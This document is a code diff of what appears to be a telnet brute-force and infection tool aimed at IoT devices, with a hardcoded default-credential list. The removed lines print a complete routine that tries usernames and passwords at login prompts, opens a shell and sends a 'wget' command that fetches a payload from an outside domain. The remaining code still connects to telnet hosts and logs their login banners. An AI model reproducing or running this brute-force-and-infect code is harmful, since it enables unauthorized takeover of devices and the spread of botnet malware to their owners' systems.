@@ -37,8 +37,6 @@ const char *password[] = {
 	"root", "admin", "password", "raspberry", "pi"
 };
 
-const char *infectline = "wget devel.bypass.cf/this/shit/works\r\n\r\n";
-
 int negotiate(int sock, unsigned char *buf, int len)
 {
         unsigned char c;
@@ -143,70 +141,17 @@ void* brute(void *input) {
 			uint16_t bufSize = 0;
 
   			if(connect(sock, (struct sockaddr*)(&sin), sizeof(struct sockaddr_in)) != 0) {
-
 				//printf("Connect fucked\n");
 				close(sock);
 				update_done(data->ip);
 				running_threads--;
 				return NULL;
-
-			}
-
-			if(readUntil(sock, "ogin:", 5, 5, 5000, buffer, 512, bufSize)) {
-
-				sleep(3);
-
-				if(send(sock, username[n], strlen(username[n]), MSG_NOSIGNAL) < 0) { 
-					close(sock);
-					continue;
-				}
-
-                                if(send(sock, "\r\n", 2, MSG_NOSIGNAL) < 0) { 
-					close(sock);
-					continue;
-				}
+			} else if(readUntil(sock, "Login:", 5, 5, 5000, buffer, 512, bufSize)) {
+				if(find_ip(data->ip))
+				printf("%s\n", buffer);
                         }
 
-			if(readUntil(sock, "assword:", 1, 0, 5000, buffer, 512, bufSize)) {
-
-				sleep(3);
-
-				if(send(sock, password[i], strlen(password[i]), MSG_NOSIGNAL) < 0) {
-					close(sock);
-					continue;
-				}
-
-				if(send(sock, "\r\n", 2, MSG_NOSIGNAL) < 0) {
-					close(sock);
-					continue;
-				}
-
-			} else if (readUntil(sock, "assword:", 1, 0, 5000, buffer, 512, bufSize)) {
-				close(sock);
-				continue;
-			}
-
-			sleep(3);
-
-			if(send(sock, "sh\r\n", 4, MSG_NOSIGNAL) < 0) {
-				close(sock);
-				update_done(data->ip);
-                                running_threads--;
-				return NULL;
-			}
-
-			if(send(sock, infectline, strlen(infectline), MSG_NOSIGNAL) < 0) {
-				printf("Executed curl\n");
-				close(sock);
-				update_done(data->ip);
-                                running_threads--;
-				return NULL;
-			}
-
-			if(readUntil(sock, "\r\n", 5, 5, 5000, buffer, 512, bufSize)) {
-				printf("%s\n", buffer);
-
-			}
+			
 
   			close(sock);
 			update_session(data->ip, NULL);
